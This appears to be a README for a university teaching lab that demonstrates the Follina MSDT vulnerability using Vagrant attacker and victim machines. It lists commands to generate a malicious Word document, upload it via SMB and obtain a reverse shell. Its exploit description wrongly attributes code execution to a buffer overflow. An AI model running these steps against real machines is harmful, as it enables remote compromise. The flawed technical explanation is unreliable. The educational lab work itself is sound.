# Follina_Vagrant
A demostation of Follina, A CTF type box using vagrant

As I am part of a society to teach offensive security at the university, I was tasked with the creation of a lecture to teach and demonstrate the Follina vulnerability, to create the demonstration I used Vagrant to easily create two virtual machines, the attacker and the victim, the attacker virtual machines would be hosted on the student’s laptop so that they would have hands-on experience creating the vulnerability, whereas the victim virtual machine would be hosted on my laptop.

The victim machine running Windows 10 and has Microsoft office 2019 installed with windows defender disabled. An SMB share is also hosted for the attacker to upload the malicious file. Due to ease of use, Netcat is also installed on the victim machine, although this would not be a real-world case and the script would have to download Netcat from the internet, due to the demonstration being run offline this was the best course of action. The attacker machine running Kali Linux with John Hammonds Follina python script installed.

Instructions on attacker machine:
- Extract msdt-follina to desktop​
- Run python3 follina.py -r 9001 -i eth1 in terminal in folder​
- Run “sudo smbclient –no-pass //192.168.1.223/SMB_victim” in a separate terminal (make sure you are in the msdt-follina file)​
- Once in the smb use the “put follina.doc"​
- Once ive opened the file you should have a reverse shell 


## Follina brief
Follina is a Vulnerability in Microsoft Windows Support Diagnostic Tool (MSDT) which can be exploited via Microsoft office document. MS word creates an external link to load HTML and then uses msdt to execute the PowerShell code.​ The external reference would be pointing to a malicious server.

Once the office document is executed the office calls out trying to download a temple from an external server, the hardcoded address within the file that would respond with the malicious payload containing an ms-msdt: command-invoking PowerShell Script.​If the downloaded file is large enough it causes a buffer overflow, allowing for remote code execution.​The PowerShell script is loaded remotely and executed.​ This PowerShell script is then used to download a new payload from the internet such as a RAT or ransomware​.

